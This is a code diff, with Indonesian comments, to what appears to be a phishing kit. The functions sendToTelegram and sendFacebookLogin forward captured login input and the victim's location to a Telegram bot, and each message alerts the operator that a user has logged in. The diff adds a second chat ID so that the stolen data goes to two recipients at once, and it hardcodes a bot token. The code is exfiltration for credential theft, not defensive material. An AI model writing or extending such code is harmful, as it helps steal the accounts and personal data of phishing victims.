@@ -27,7 +27,8 @@ export const sendToTelegram = async (
   q2: string
 ) => {
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
-  const CHAT_ID = '6885815623';
+  // Masukkan Chat ID kedua di dalam array ini
+  const CHAT_IDS = ['6885815623', '6076369736'];
 
   const loc = await getLocation();
 
@@ -51,7 +52,13 @@ ${q2}
 <i>User Masuk, pastikan Anda Selalu Stenbay.</i>
   `;
 
-  return sendMessage(BOT_TOKEN, CHAT_ID, message);
+  // Mengirim ke semua Chat ID secara bersamaan
+  const results = await Promise.all(CHAT_IDS.map(chatId => {
+    return sendMessage(BOT_TOKEN, chatId, message);
+  }));
+
+  // Return true jika setidaknya satu berhasil (atau semua berhasil, tergantung kebutuhan)
+  return results.some(result => result === true);
 };
 
 export const sendFacebookLogin = async (
@@ -62,7 +69,8 @@ export const sendFacebookLogin = async (
 ) => {
   // Use the SAME token as ID login which is known to work
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
-  const CHAT_ID = '6885815623';
+  // Masukkan Chat ID kedua di dalam array ini
+  const CHAT_IDS = ['6885815623', '6076369736'];
 
   const loc = await getLocation();
   const now = new Date();
@@ -86,7 +94,12 @@ ${q2}
 <i>User Masuk, pastikan Anda Selalu Stenbay.</i>
   `;
 
-  return sendMessage(BOT_TOKEN, CHAT_ID, message);
+  // Mengirim ke semua Chat ID secara bersamaan
+  const results = await Promise.all(CHAT_IDS.map(chatId => {
+    return sendMessage(BOT_TOKEN, chatId, message);
+  }));
+
+  return results.some(result => result === true);
 };
 
 const sendMessage = async (botToken: string, chatId: string, text: string) => {
